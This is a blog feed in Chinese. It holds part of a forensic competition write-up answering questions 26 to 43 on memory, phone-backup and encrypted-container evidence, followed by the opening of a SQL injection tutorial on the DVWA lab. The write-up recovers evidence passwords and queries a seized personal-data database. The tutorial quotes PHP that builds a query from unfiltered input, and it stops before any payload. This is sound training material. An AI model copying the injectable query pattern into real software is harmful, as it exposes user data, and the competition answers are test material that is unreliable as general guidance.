&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;11328
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;26检材三中显示的系统时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;26.检材三中显示的系统时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.info.Info  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709211018795.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709211018795&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2023-12-12 04:06:25
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;27检材三中记录的当前系统ip是多少&#34;&gt;27.检材三中记录的当前系统ip是多少?
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f ../memdump2023.raw windows.netscan.NetScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200824096.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709200824096&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;172.18.7.229
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材四-红米手机备份数据&#34;&gt;检材四 (红米手机备份数据)
&lt;/h1&gt;&lt;h2 id=&#34;28检材四中迅雷下载过的文件名是什么&#34;&gt;28.检材四中迅雷下载过的文件名是什么?
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 迅雷 -&amp;gt; 云盘 -&amp;gt; 离线下载目录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193648459.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709193648459&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;《向银河靠近》.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;29检材四中安装了哪些可是实现翻墙vpn功能的-app&#34;&gt;29.检材四中安装了哪些可是实现翻墙(VPN)功能的 app?
&lt;/h2&gt;&lt;p&gt;没啥说的：
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193825301.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709193825301&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;clash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;30检材四备份的设备系统版本是多少&#34;&gt;30.检材四备份的设备系统版本是多少?
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息-&amp;gt; 设备信息 -&amp;gt; 厂商版本：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709193935053.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709193935053&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; V14.0.2.0.TKSCNXM
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;31检材四备份的时间是多少答案以-13-位时间戳表示&#34;&gt;31.检材四备份的时间是多少(答案以 13 位时间戳表示)
&lt;/h2&gt;&lt;p&gt;同上题图，转换时间戳（2023-12-13 17:20:32）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1702459232429
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;32检材四中-filecompress-app-包名是什么&#34;&gt;32.检材四中 FileCompress app 包名是什么?
&lt;/h2&gt;&lt;p&gt;包名就在检材里面列出，复制黏贴就行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195000907.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709195000907&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;com.zs.filecompress
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;33检材四中备忘录记录的内容是什么&#34;&gt;33.检材四中备忘录记录的内容是什么?
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息-&amp;gt; 便签：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709194341673.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709194341673&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vcpswd:edgewallet
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;34请列出检材四中所有虚拟币钱包-app-的包名-如有多个用顿号分隔&#34;&gt;34.请列出检材四中所有虚拟币钱包 app 的包名, 如有多个用顿号分隔
&lt;/h2&gt;&lt;p&gt;直接搜索检材里的app，一共六个：
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709195051880.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709195051880&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;35检材四中嫌疑人使用-bitcoin-wallet-钱包地址是什么&#34;&gt;35.检材四中嫌疑人使用 Bitcoin Wallet 钱包地址是什么?
&lt;/h2&gt;&lt;p&gt;在下面路径中找到并导出日志文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bitcoin Wallet(de.schildbach.wallet).bak/apps/de.schildbach.wallet/f/log/wallet.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200125980.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709200125980&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;搜索&lt;code&gt;walletaddress&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709200547089.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709200547089&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;36md5-值为ff3dabd0a610230c2486bffbe15e5dff的文件在检材四中的位置&#34;&gt;36.MD5 值为&amp;quot;FF3DABD0A610230C2486BFFBE15E5DFF&amp;quot;的文件在检材四中的位置
&lt;/h2&gt;&lt;p&gt;这一题据说是结合前面提到的FileCompress一路找下去就能发现，不过太电波了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202128966.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709202128966&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这里更好的办法是用HashMyFiles，全部算一遍再搜索&lt;/p&gt;
&lt;p&gt;然而我不知道怎么使用这个工具，好在火眼有类似的功能&lt;/p&gt;
&lt;p&gt;文件 -&amp;gt; 检材四 -&amp;gt; 文件系统 -&amp;gt; 勾选所有文件 -&amp;gt; 右键新建哈希集 -&amp;gt; 勾选项：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710124643356.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250710124643356&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;创建的新建哈希集任务完成后，选择高级，在文件哈希处输入MD5，过滤范围选择子目录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710124613331.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250710124613331&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;成功找到目标文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710125044835.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250710125044835&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;20231213_172032.tar/FileCompress(com.zs.filecompress).bak/FileCompress/11月.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;综合题目&#34;&gt;综合题目
&lt;/h1&gt;&lt;h2 id=&#34;37检材中受害人的微信号是多少&#34;&gt;37.检材中受害人的微信号是多少?
&lt;/h2&gt;&lt;p&gt;检材二 -&amp;gt; 微信 -&amp;gt; 好友消息，根据聊天记录能判断出受害者就是小浩：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202302479.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709202302479&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B-I-N-A-R-Y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;38嫌疑人曾通过微信购买过一个公民信息数据库-该数据库中手机尾号是-8686-的用户的姓名是&#34;&gt;38.嫌疑人曾通过微信购买过一个公民信息数据库, 该数据库中手机尾号是 8686 的用户的姓名是
&lt;/h2&gt;&lt;p&gt;从另一个微信好友里面能发现购买数据库的名称为database.sqlite：
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202654797.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709202654797&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这个数据库手机看不了，在电脑里能看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709202742412.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709202742412&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;链接数据库后查找：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;phone&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;%8686&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710130255431.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250710130255431&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;章敏
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;39嫌疑人手机中是否保存了小西米语音-app-的账号密码-如有-请写出其密码&#34;&gt;39.嫌疑人手机中是否保存了小西米语音 app 的账号密码, 如有, 请写出其密码
&lt;/h2&gt;&lt;p&gt;加密iOS备份 -&amp;gt; 钥匙串 -&amp;gt; 网站与应用密码，我们已经知道小西米的包名&lt;code&gt;com.titashow.tangliao&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709203150613.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709203150613&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; jamvU1@wiwgug$bo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;40公民信息数据库中-截止到-2023-年-12-月-31-日-年龄大于等于-18-且小于等于-30-岁之间的用户信息数量&#34;&gt;40.公民信息数据库中, 截止到 2023 年 12 月 31 日, 年龄大于等于 18 且小于等于 30 岁之间的用户信息数量
&lt;/h2&gt;&lt;p&gt;在38题中得到的database数据库里进行查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; (&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;20231231&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;substr&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;IDCARD&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;8&lt;/span&gt;)) &lt;span style=&#34;color:#c678dd&#34;&gt;between&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;180000&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;300000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712112610915.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250712112610915&#34;
	
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1572
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;41受害人小浩的手机号码是多少&#34;&gt;41.受害人小浩的手机号码是多少
&lt;/h2&gt;&lt;p&gt;在上面的数据库中没有找到叫小浩的人，微信和短信也没有小浩的联系方式&lt;/p&gt;
&lt;p&gt;结果是之前找到的11月.txt是受害者名单，怎么发现的呢？&lt;/p&gt;
&lt;p&gt;案件 -&amp;gt; 快速分析 -&amp;gt; 耗时任务 -&amp;gt; 特征分析：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712105749212.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250712105749212&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;分析任务完成后，在文件 -&amp;gt; 检材 -&amp;gt; 加密文件中找到TrueCrypt容器&lt;/p&gt;
&lt;p&gt;在检材1的20231212.E01/分区6/Users/rd/Documents下有一个新建文本文档.txt是加密容器，有88MB：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250712105717926.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250712105717926&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;之前备忘录发现的内容Vcpswd:edgewallet，在检材一edge密码中找到对应内容：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709205612210.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709205612210&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;从字面猜测这个密码应该就是vc加密的密码&lt;code&gt;pR7)nZ5&amp;amp;yQ2-oR0&amp;lt;&lt;/code&gt;，而加密卷应该就是那个很大的txt文件&lt;/p&gt;
&lt;p&gt;挂载：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709205220440.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709205220440&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;发现里面存在9月和10月两个名单：
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709205824323.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709205824323&#34;
	
	
&gt;九月是未加密的txt文件，十月却不是txt文件，而是一个pk开头的压缩包，应该是和11月一样的加密方式&lt;/p&gt;
&lt;p&gt;压缩包密码藏在了FileCompress软件中，找出软件安装包（apk）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FileCompress(com.zs.filecompress).bak/apps/com.zs.filecompress/a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;导出后，使用jadx逆向：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710121649367.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250710121649367&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;com下找到主函数，代码逻辑中得到密码&lt;code&gt;1!8Da9Re5it2b3a.&lt;/code&gt;，解密10月和11月：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709210608385.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250709210608385&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;小浩的手机号：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;13533333333
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;42完整的受害人名单是几个人&#34;&gt;42.完整的受害人名单是几个人
&lt;/h2&gt;&lt;p&gt;上题得知，一共6人&lt;/p&gt;
&lt;h2 id=&#34;43受害人转账的总金额是多少&#34;&gt;43.受害人转账的总金额是多少
&lt;/h2&gt;&lt;p&gt;检材二中有一次付款，加密备份中有两次付款，每次都是200，通过上下文语境能知道三次付款没有重叠&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;600
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>SQL注入：从入门到入土</title>
        <link>https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</link>
        <pubDate>Wed, 02 Jul 2025 00:52:02 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</guid>
        <description>&lt;p&gt;SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而得到相应的数据信息&lt;/p&gt;
&lt;p&gt;我们可以选择&lt;strong&gt;手工注入&lt;/strong&gt;，也能够选择使用自动化工具&lt;strong&gt;sqlmap&lt;/strong&gt;进行注入&lt;/p&gt;
&lt;h1 id=&#34;手工注入&#34;&gt;手工注入
&lt;/h1&gt;&lt;h2 id=&#34;0-环境配置&#34;&gt;#0 环境配置
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;使用靶机：DVWA mysql&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将DVWA的security级别设置为low，可以看到php源码中是一句简单的查询语句，没有进行任何过过滤&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当用户输入查询内容的时候，$id将会被替换成此内容：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$query&lt;/span&gt;  &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;比如，我们输入1，那么执行的语句就是&lt;/p&gt;
